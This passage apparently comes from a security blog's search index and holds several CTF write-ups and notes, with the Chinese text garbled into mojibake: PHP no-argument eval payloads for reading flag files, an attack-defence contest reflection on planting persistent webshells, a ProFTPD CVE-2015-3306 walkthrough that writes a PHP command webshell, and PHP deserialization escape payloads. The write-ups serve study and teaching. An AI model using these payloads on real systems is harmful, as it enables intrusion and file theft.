#å°†æ‰«æç»“æœæ•°ç»„äº¤æ¢é”®åä¸é”®å€¼ array_rand(array_flip(scandir(pos(localeconv())))) #éšæœºé€‰å–æ•°ç»„é”®åï¼Œå³éšæœºé€‰å–æ–‡ä»¶å readfile(array_rand(array_flip(scandir(pos(localeconv()))))) #è¯»å–æ–‡ä»¶ var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))) #è¾“å‡ºè¯»å–æ–‡ä»¶ç»“æœ Payload2 1var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))); åˆ†æ phpversion() #è¾“å‡ºphpå½“å‰ç‰ˆæœ¬ ceil(cosh(cosh(tan(ceil(atan(phpversion())))))) #ä½¿ç”¨æ•°å­¦å‡½æ•°è®¡ç®—å¾—å‡º46 chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))) #å°†46è½¬ä¸º. scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))) #æ‰«æå½“å‰ç›®å½• array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))) #éšæœºé€‰å–æ•°ç»„é”®åï¼Œå³éšæœºé€‰å–æ–‡ä»¶å readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))))) #è¯»å–æ–‡ä»¶ var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))) #è¾“å‡ºè¯»å–æ–‡ä»¶ç»“æœ Fuzzè„šæœ¬ 123456789101112131415161718&lt;?php ini_set(&quot;display_errors&quot;, &quot;off&quot;); function pass($para) &#123; return $para; &#125; $func = array(&#x27;sqrt&#x27;, &#x27;tan&#x27;, &#x27;sinh&#x27;, &#x27;cosh&#x27;, &#x27;atan&#x27;, &#x27;ceil&#x27;, &#x27;floor&#x27;, &#x27;cos&#x27;, &#x27;sin&#x27;, &#x27;pass&#x27;); foreach($func as $a)&#123; foreach($func as $b)&#123; foreach($func as $c)&#123; foreach($func as $d)&#123; foreach($func as $e)&#123; if(ceil($a($b($c($d($e(phpversion())))))) == 46) &#123; echo &quot;ceil($a($b($c($d($e(phpversion()))))))\\n&quot;; &#125; &#125;&#125;&#125;&#125;&#125;?&gt; phpä¸­å¹¶æ²¡æœ‰ç±»ä¼¼äºpythonä¸­çš„pass()ï¼Œæ‰€ä»¥æœ‰ç‚¹å¯æƒœ è¿™é‡Œudfçš„pass()æ˜¯ä¸ºäº†æ›´ä¾¿åˆ©åœ°è¿›è¡Œfuzz ä½¿ç”¨æ•°å­¦å‡½æ•°æœ€å°‘éœ€è¦å…­æ¬¡è¿­ä»£ï¼Œä½¿ç”¨pass()èƒ½å¤Ÿåœ¨æ›´å¤šæ¬¡è¿­ä»£ä¸­æ‰¾åˆ°è¿­ä»£æ¬¡æ•°æ›´å°‘çš„è§£æ³• [ByteCTF2019]Boring_Code èŠ‚é€‰éƒ¨åˆ†ä»£ç  1234567891011121314&lt;?php$code = $_GET[&quot;code&quot;];if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code))&#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125;&#125;?&gt; flagä¸ºä¸Šå±‚ç›®å½•çš„æœ€åä¸€ä¸ªæ–‡ä»¶ Payload0 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); åˆ†æ localeconv() #ç”Ÿæˆæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸º. pos(localeconv()) #å–ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³. scandir(pos(localeconv())) #æ‰«æå½“å‰ç›®å½• next(scandir(pos(localeconv()))) #é€‰å–å…ƒç´ .. chdir(next(scandir(pos(localeconv())))) #è¿›å…¥ä¸Šçº§ç›®å½• time(chdir(next(scandir(pos(localeconv()))))) #ç”Ÿæˆæ—¶é—´æˆ³ï¼Œphp7.4ç‰ˆæœ¬ä¸­æ— æ³•è¿›è¡Œå†…åµŒå‡½æ•° localtime(time(chdir(next(scandir(pos(localeconv())))))) #å°†æ—¶é—´æˆ³è½¬ä¸ºæ•°ç»„å½¢å¼çš„æœ¬åœ°æ—¶é—´ pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))) #é€‰å–ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³ç§’ chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #è½¬ä¸ºASCIIå­—ç¬¦ï¼Œ46ç§’æ—¶æ‰§è¡Œå¯ä»¥å¾—åˆ°. scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))) #æ‰«æå½“å‰ç›®å½• end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #é€‰å–æœ€åä¸€ä¸ªæ–‡ä»¶ï¼Œå³flagæ–‡ä»¶ readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #è¯»å–flagæ–‡ä»¶ echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))) #è¾“å‡ºè¯»å–flagæ–‡ä»¶çš„å†…å®¹ Payload1 1if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))echo(readfile(end(scandir(strrev(crypt(serialize(array())))))))); åˆ†æ ifè¯­å¥ç”¨äºè¿”å›ä¸Šä¸€çº§ï¼Œä¸”chdirçš„è¿”å›ç»“æœä¸º1ï¼Œæ§åˆ¶ifè¯­å¥æ‰§è¡Œä¹‹åçš„ç”¨äºè¯»å–flagçš„åµŒå¥—å‡½æ•° [ç¬¬äº”å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›]Decade 1234567891011121314151617&lt;?phphighlight_file(__FILE__);$code = $_GET[&#x27;code&#x27;];if (!empty($code)) &#123; if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; else &#123; echo &quot;No way!!!&quot;; &#125;&#125;else &#123; echo &quot;No way!!!&quot;; &#125; è¿™é‡Œç®€å•å†™ä¸€ä¸‹è¯»å–æ–‡ä»¶çš„æ€è·¯ ç”±äºreadfileè¢«Banï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨file()æ¥è¿›è¡Œæ–‡ä»¶è¯»å– è‡³äºflagçš„è¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨serialize()è¿›è¡Œåºåˆ—åŒ–ï¼Œjoin()æ¥è®²æ•°ç»„è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œæˆ–è€…ç”¨next()æŒ‡å‘flag","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"}]},{"title":"æ³‰å·å¸‚ç½‘ç»œå®‰å…¨æ”»é˜²æ¯”èµ›çº¿ä¸‹èµ›å¤ç›˜","slug":"Reflection-For-Quanzhou-Race","date":"2021-01-14T12:24:07.000Z","updated":"2021-01-16T05:46:53.000Z","comments":true,"path":"2021/01/14/Reflection-For-Quanzhou-Race/","link":"","permalink":"https://yoloyolo.top/2021/01/14/Reflection-For-Quanzhou-Race/","excerpt":"AWDå°ç»“&amp;åæ€","text":"AWDå°ç»“&amp;åæ€ Attack ç†æƒ³åŒ–çš„æ”»å‡»æµç¨‹åº”è¯¥ä¸º Dç›¾æ‰«æé»˜è®¤åé—¨ -&gt; ç¼–å†™PYè„šæœ¬è¿›è¡Œæ‰¹é‡ç§æ¤ä¸æ­»é©¬ -&gt; ä¸æ­»é©¬ç»´æŒæƒé™æŒç»­Getflag ä½†æ˜¯å½“æ—¶åªæ˜¯åœ¨ç”¨PYè„šæœ¬åˆ©ç”¨é»˜è®¤åé—¨å»æ‰¹é‡Getflag è¿™å°±å¯¼è‡´äº†åæœŸåé—¨è¢«ä¿®å¤çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½ä¸å‰é¢çš„é˜Ÿä¼ç¼©å°å·®è· è€Œå½“æ—¶çš„webæƒé™ç»™å¾—å¾ˆå¤§ï¼Œå¯ä»¥åˆ æ‰ /var/www/html ä¸‹çš„å†…å®¹ å¦‚æœå½“æ—¶æœ‰ä½¿ç”¨ä¸æ­»é©¬ï¼Œé‚£å°±å¯ä»¥è¿›è¡Œåˆ é™¤æ“ä½œï¼Œé˜»æ­¢å…¶ä»–é˜Ÿä¼å¾—åˆ† åŒæ—¶åˆ©ç”¨ä¸æ­»é©¬æ¥Getflagï¼Œè¿™æ ·å°±å¯ä»¥è¿…é€Ÿç¼©å°å·®è· å¦‚æœæ˜¯æ¯”èµ›æ°´å‡†ç¨å¾®é«˜ä¸€äº›çš„è¯ï¼Œåº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§webæƒé™è¿‡å¤§çš„æƒ…å†µ é‚£ä¹ˆå¯ä»¥å°è¯•ä½¿ç”¨ä¸æ­»é©¬æ¥å¸®åŠ©åˆ«äººPatchæ‰å·²çŸ¥åé—¨ Defend Webæºç çš„å¤‡ä»½ä¸æ•°æ®åº“çš„å¤‡ä»½å’Œè¿˜åŸè‡ªç„¶æ— éœ€å¤šè¨€ ä¸»è¦æ˜¯æ—¥å¿—å®¡è®¡ä»¥åŠæµé‡æ•è· é€šè¿‡è¿™ä¸¤è€…æ¥ååŠ©è‡ªå·±åˆ†ææœåŠ¡å™¨ä¸Šä»å­˜åœ¨çš„æ¼æ´ æˆ–è€…æ˜¯åœ¨æŸä¸ªç›®å½•ä¸‹å­˜åœ¨ä¸æ­»é©¬ å…¶æ¬¡ï¼Œåˆ†æä¸æ­»é©¬æµé‡ä¹‹åä¹Ÿå¯ä»¥å°è¯•é‡æ”¾æ¥å€Ÿåˆ«äººçš„ä¸æ­»é©¬Getflag ä¸€èˆ¬Hashé©¬çš„å¯†ç éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥å°è¯•ä¸€æ³¢ä¹Œé¸¦åé£æœº ä½†æ˜¯å½“æ—¶è²Œä¼¼æ²¡æœ‰æƒé™å»ç›‘å¬ç½‘å¡ï¼Œå¾ˆçº³é—·","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"Reflection","slug":"Reflection","permalink":"https://yoloyolo.top/tags/Reflection/"}]},{"title":"CVE-2015-3306 æµ…æ","slug":"EZ-Analysis-For-CVE-2015-3306","date":"2021-01-14T12:17:21.000Z","updated":"2021-01-25T16:43:51.000Z","comments":true,"path":"2021/01/14/EZ-Analysis-For-CVE-2015-3306/","link":"","permalink":"https://yoloyolo.top/2021/01/14/EZ-Analysis-For-CVE-2015-3306/","excerpt":"ProFTPD 1.3.5 mod_copy RCE","text":"ProFTPD 1.3.5 mod_copy RCE è¯¥æ¼æ´çš„æè¿°å¦‚ä¸‹ 12The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.ProFTPD 1.3.5ä¸­çš„mod_copyæ¨¡å—å…è®¸è¿œç¨‹å…¥ä¾µè€…é€šè¿‡site cpfrå’Œsite cptoå‘½ä»¤è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å†™ åŸºäºä»»æ„æ–‡ä»¶è¯»å†™çš„æ“ä½œï¼Œå¯ä»¥å°†ç›®æ ‡æœºå™¨ä¸Šçš„ä¸€äº›æ•æ„Ÿä¿¡æ¯æ–‡ä»¶æ‹·è´è‡³å¯è®¿é—®è·¯å¾„(WEBè·¯å¾„/SMBè·¯å¾„/etc.)æ¥è¿›è¡Œè¯»å– ç”šè‡³å¯ä»¥è¿›è¡Œå†™å…¥WebShellçš„æ“ä½œï¼Œæ“ä½œå¦‚ä¸‹ 1234site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php /proc/[pid]/cmdline /proc/[pid]/cmdline This read-only file holds the complete command line for theprocess, unless the process is a zombie. è¿›ç¨‹åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰ä¼šä»è¯¥æ–‡ä»¶è·å–å‘½ä»¤ï¼Œæ‰€ä»¥ftpè¿›ç¨‹åœ¨æ‰§è¡Œ site cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php æ—¶ /proc/self/cmdline ä¸­çš„å†…å®¹å·²ç»å˜æˆäº† 10.100.120.31:57420: SITE cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php å³æ‹·è´è¿™æ®µå†…å®¹è‡³ /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php åé¢ä¸¤æ¡å‘½ä»¤çš„æ“ä½œå³ä¸ºä¿®æ”¹æ–‡ä»¶å å³å¯ä»¥ä½¿ç”¨è¯¥æ¼æ´æ¥è¿›è¡ŒWebShellçš„å†™å…¥æ“ä½œ","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"FTP","slug":"FTP","permalink":"https://yoloyolo.top/tags/FTP/"},{"name":"CVE","slug":"CVE","permalink":"https://yoloyolo.top/tags/CVE/"}]},{"title":"PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸","slug":"PHP-Unserialize-String-Escape","date":"2021-01-14T10:58:23.000Z","updated":"2021-01-25T16:41:23.000Z","comments":true,"path":"2021/01/14/PHP-Unserialize-String-Escape/","link":"","permalink":"https://yoloyolo.top/2021/01/14/PHP-Unserialize-String-Escape/","excerpt":"PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸å°ç»“","text":"PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸å°ç»“ 101 æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ– 12345678910echo var_dump(unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;&#x27;));object(test)#2 (3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;pass&quot;]=&gt; string(5) &quot;admin&quot;&#125; éæ­£å¸¸ 12345678910echo var_dump(unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacked&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;&#x27;));object(test)#2 (3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;pass&quot;]=&gt; string(6) &quot;hacked&quot;&#125; è¿™é‡Œæˆ‘ä»¬æŠŠç”¨æˆ·åå¤„çš„æ•°æ®æ”¹ä¸º admin&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacked&quot;;&#125; è€Œä¹‹åçš„ &quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125; åˆ™ä¼šè¢«å¿½ç•¥ [0CTF 2016]piapiapia 12345678910#update.phpif(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;);move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);$user-&gt;update_profile($username, serialize($profile)); åœ¨æ›´æ–°ä¿¡æ¯æ—¶ï¼Œnicknameå‚æ•°å¯ä»¥ä½¿ç”¨æ•°ç»„ç±»å‹bypassé•¿åº¦é™åˆ¶ ä½†æ— æ³•ç›´æ¥æ§åˆ¶ $profile['photo'] çš„å†…å®¹ 123456789#profile.php$username = $_SESSION[&#x27;username&#x27;];$profile=$user-&gt;show_profile($username);$profile = unserialize($profile);$phone = $profile[&#x27;phone&#x27;];$email = $profile[&#x27;email&#x27;];$nickname = $profile[&#x27;nickname&#x27;];$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); åœ¨æ˜¾ç¤ºä¿¡æ¯æ—¶ï¼Œ $profile['photo'] ä¸ºè¯»å–çš„æ–‡ä»¶ æ­¤é¢˜æ€è·¯å³ä¸ºå°†è¯¥å‚æ•°çš„å†…å®¹æ”¹ä¸ºå­˜æœ‰flagçš„æ–‡ä»¶ 123456789101112131415161718#class.phppublic function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile;&#125;public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string);&#125; å­˜å…¥ä¿¡æ¯æ—¶ï¼Œå­˜åœ¨å­—ç¬¦æ›¿æ¢ï¼Œå…¶ä¸­&quot;where&quot; -&gt; &quot;hacker&quot;å­˜åœ¨å­—ç¬¦ä¸²é•¿åº¦å˜é•¿çš„é—®é¢˜ 12345678#config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; éœ€è¦è¯»å–çš„æ–‡ä»¶ä¸ºconfig.php ç®€å•æµ‹è¯•ä¸€ä¸‹åºåˆ—åŒ–çš„ç»“æœ 123456789$file[&#x27;tmp_name&#x27;] = &#x27;11111&#x27;;move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1@1.1&#x27;;$profile[&#x27;nickname&#x27;] = array(&#x27;1111111111&#x27;);$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);echo serialize($profile);a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:10:&quot;1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; é‚£ä¹ˆå¯ä»¥åœ¨nicknameå¤„ä½œä¸€äº›å¤„ç†ï¼Œæˆ‘ä»¬è¦è¯»å–çš„å†…å®¹ä¸ºconfig.php é‚£ä¹ˆå¯ä»¥è®¾ç½®nicknameçš„å€¼ä¸º 1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php ç»“æœå¦‚ä¸‹ 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:41:&quot;1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; ä½†æ˜¯nicknameä¸­i:0;s:41ä»ç„¶é™å®šäº†å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œååºåˆ—åŒ–æ—¶ä¼šå°† 1111111111&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php ä½œä¸ºå€¼ è¿™æ—¶å€™å¯ä»¥ç”¨åˆ°&quot;where&quot; -&gt; &quot;hacker&quot;è¿™ä¸ªå­—ç¬¦ä¸²æ›¿æ¢çš„æœºåˆ¶ æ•°æ®çš„å¤„ç†æµç¨‹ä¸º&quot;åºåˆ—åŒ–-&gt;å¤„ç†å­—ç¬¦ä¸²-&gt;ååºåˆ—åŒ–&quot; é‚£ä¹ˆå°±å­˜åœ¨å¦‚ä¸‹æƒ…å†µ 1&#123;i:0;s:6:&quot;where&quot;&quot;;&#125; -&gt; &#123;i:0;s:6:&quot;hacker&quot;&quot;;&#125; è¾“å…¥ä¸ºwhere&quot; è€Œæ›¿æ¢ä¹‹åå¯ä»¥ä½¿å¾—&quot;è¿›è¡Œé€ƒé€¸ åŸºäºè¿™ä¸ªæƒ…å†µå°±å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œ è¾“å…¥çš„nicknameä¸º 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php åºåˆ—åŒ–çš„ç»“æœä¸º 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; è¿›è¡Œæ›¿æ¢ä¹‹åä¸º 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.1&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; å³å¯ä½¿å¾—æ‰€éœ€å†…å®¹ &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php è¿›è¡Œé€ƒé€¸ [å®‰æ´µæ¯ 2019]easy_serialize_php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; ç²—ç•¥çœ‹ä¸Šå»æ˜¯éœ€è¦æ§åˆ¶ $_SESSION['img'] è¿™ä¸ªå‚æ•°æ¥è¯»å–ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°æ˜¯æ— æ³•ç›´æ¥è¿›è¡Œæ§åˆ¶çš„ å³ä½¿ extract($_POST); å¯ä»¥å¯¹ $_SESSION['img'] è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šè¢«ä¹‹åçš„ä»£ç å†æ¬¡è¦†ç›– filter()å‡½æ•°ä¼šå¯¹ä¸€äº›å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºï¼Œç”¨æ¥å¤„ç†åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸å®‰å…¨çš„ é»˜è®¤çš„ $serialize_info 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; å¯ä»¥è€ƒè™‘ä½¿ç”¨å˜é‡è¦†ç›–æ¥é‡æ–°æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸² 123_SESSION[user]=&amp;_SESSION[function]=a:3:&#123;s:4:&quot;user&quot;;s:0:&quot;&quot;;s:8:&quot;function&quot;;s:0:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; å¯ä»¥åœ¨functionå¤„æ„é€ imgå‚æ•° ç„¶ååœ¨userå¤„æ„é€ è¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²ï¼Œå°†fuctionè½¬ä¸ºuserçš„å€¼ï¼Œä»è€Œä½¿functionå¤„æ„é€ çš„imgå‚æ•°å¯ä»¥é€ƒé€¸ 123_SESSION[user]=phpflagflagphpflagflag&amp;_SESSION[function]=;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:56:&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; å¯¹åºåˆ—åŒ–çš„ç»“æœè¿›è¡Œæ“ä½œæ˜¯ä¸å®‰å…¨çš„ï¼Œåº”å½“å°½é‡é¿å…","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"}]},{"title":"Rebuild Project","slug":"Rebuild-Project","date":"2021-01-10T14:33:23.000Z","updated":"2021-01-14T12:25:14.000Z","comments":true,"path":"2021/01/10/Rebuild-Project/","link":"","permalink":"https://yoloyolo.top/2021/01/10/Rebuild-Project/","excerpt":"","text":"Start at 2021.01.14 Going to explore the unknown.","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/tags/Talk/"}]}],"categories":[{"name":"WrtiteUp","slug":"WrtiteUp","permalink":"https://yoloyolo.top/categories/WrtiteUp/"},{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"},{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"},{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"},{"name":"CBC","slug":